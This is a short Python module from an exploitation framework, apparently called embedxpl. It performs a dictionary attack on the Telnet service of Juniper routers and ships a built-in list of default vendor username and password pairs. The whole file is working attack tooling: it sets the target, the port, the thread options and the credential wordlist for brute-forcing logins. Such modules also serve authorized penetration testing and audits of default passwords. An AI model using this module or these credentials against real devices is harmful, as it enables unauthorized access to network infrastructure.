from embedxpl.core.exploit import *
from embedxpl.modules.creds.generic.telnet_default import Exploit as TelnetDefault


class Exploit(TelnetDefault):
    __info__ = {
        "name": "Juniper Router Default Telnet Creds",
        "description": "Module performs dictionary attack against Juniper Router Telnet service. "
                       "If valid credentials are foundm they are displayed to the user.",
        "authors": (
            "André Henrique (@mrhenrike) | União Geek",
        ),
        "devices": (
            "Juniper Router",
        ),
    }

    target = OptIP("", "Target IPv4, IPv6 address or file with ip:port (file://)")
    port = OptPort(23, "Target Telnet port")

    threads = OptInteger(1, "Number of threads")
    defaults = OptWordlist("admin:abc123,admin:netscreen,netscreen:netscreen,super:juniper123,admin:,root:,admin:password", "User:Pass or file with default credentials (file://)")
